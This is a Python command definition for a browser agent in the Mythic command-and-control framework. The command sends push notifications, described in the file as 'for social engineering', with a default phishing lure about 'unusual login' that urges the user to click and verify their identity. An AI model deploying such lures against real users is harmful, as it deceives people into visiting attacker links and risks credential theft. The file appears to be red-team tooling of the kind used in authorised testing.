from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class NotificationsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="title",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value="IT Security Alert",
                description="Notification title",
            ),
            CommandParameter(
                name="body",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value="Unusual login detected on your account. Click to verify your identity.",
                description="Notification body text",
            ),
            CommandParameter(
                name="icon",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value="",
                description="URL to notification icon image (optional)",
            ),
            CommandParameter(
                name="url",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value="",
                description="URL to open when notification is clicked (optional)",
            ),
            CommandParameter(
                name="count",
                type=ParameterType.Number,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value=1,
                description="Number of notifications to send",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            try:
                self.load_args_from_json_string(self.command_line)
            except:
                pass

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class NotificationsCommand(CommandBase):
    cmd = "notifications"
    needs_admin = False
    help_cmd = "notifications"
    description = "Send browser push notifications for social engineering. Customizable title, body, icon, and click URL. Will request permission if not already granted."
    version = 1
    author = "@grampae"
    attackmapping = ["T1204.001"]
    argument_class = NotificationsArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Browser]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        title = task.args.get_arg("title") or "IT Security Alert"
        count = task.args.get_arg("count") or 1
        task.display_params = '"{}" x{}'.format(title, count)
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
